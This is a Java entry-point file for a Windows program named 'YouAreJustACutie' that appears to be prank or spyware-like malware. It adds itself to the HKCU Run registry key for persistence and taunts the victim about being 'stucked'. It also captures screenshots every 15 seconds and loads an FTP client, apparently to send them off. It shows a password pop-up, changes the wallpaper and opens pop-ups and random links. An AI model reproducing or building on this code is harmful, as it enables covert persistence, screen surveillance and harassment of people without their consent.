package fr.mimifan.jac;

import fr.mimifan.jac.browser.BrowserManager;
import fr.mimifan.jac.popups.PasswordPopup;
import fr.mimifan.jac.popups.PopupsManager;
import fr.mimifan.jac.screens.ScreenShotter;
import fr.mimifan.jac.ftp.FileTransferClient;
import fr.mimifan.jac.utils.CutieInfos;
import fr.mimifan.jac.wallpaper.WallpaperManager;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URISyntaxException;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import com.formdev.flatlaf.FlatDarculaLaf;

public class Main {


    public static void main(String[] args) throws IOException, URISyntaxException, InterruptedException {

        FlatDarculaLaf.setup();

        InetAddress localhost = InetAddress.getLocalHost();
        CutieInfos.hostname = localhost.getHostName();

        BrowserManager.openLink("https://discord.gg/DKnqAAvAwa");

        String runKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        String appName = "YouAreJustACutie";

        Process processCheck = Runtime.getRuntime().exec("reg query \"" + runKey + "\" /v " + appName);
        BufferedReader readerCheck = new BufferedReader(new InputStreamReader(processCheck.getInputStream()));
        String line;
        boolean entryExists = false;
        while ((line = readerCheck.readLine()) != null) {
            if (line.contains(appName)) {
                entryExists = true;
                break;
            }
        }
        readerCheck.close();

        if(!entryExists) {
            String programPath = Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getRawPath();
            Process runOnStartupProcess = Runtime.getRuntime().exec(
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v YouAreJustACutie /t REG_SZ /d \"java -jar " + programPath + "\"");

            BufferedReader outputReader = new BufferedReader(new InputStreamReader(runOnStartupProcess.getInputStream()));
            String outputLine;
            while ((outputLine = outputReader.readLine()) != null) System.out.println(outputLine);

            runOnStartupProcess.waitFor();
            outputReader.close();
            System.out.println("There there, now you should be stucked here everytime you start your pc :3");
        }

        new CutieInfos();
        System.out.println(CutieInfos.cutiesDiscordName);

        FileTransferClient.getInstance().load();

        Thread popupsThread = new Thread(PopupsManager::load);
        popupsThread.start();

        Thread wallpaperThread = new Thread(WallpaperManager::changeWallPaper);
        wallpaperThread.start();


        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);

        PasswordPopup passwordPopup = new PasswordPopup();
        passwordPopup.setVisible(true);


        Thread websitesThread = new Thread(BrowserManager::randomLinks);
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                websitesThread.start();
            }
        }, 90 * 1000);

    }

}
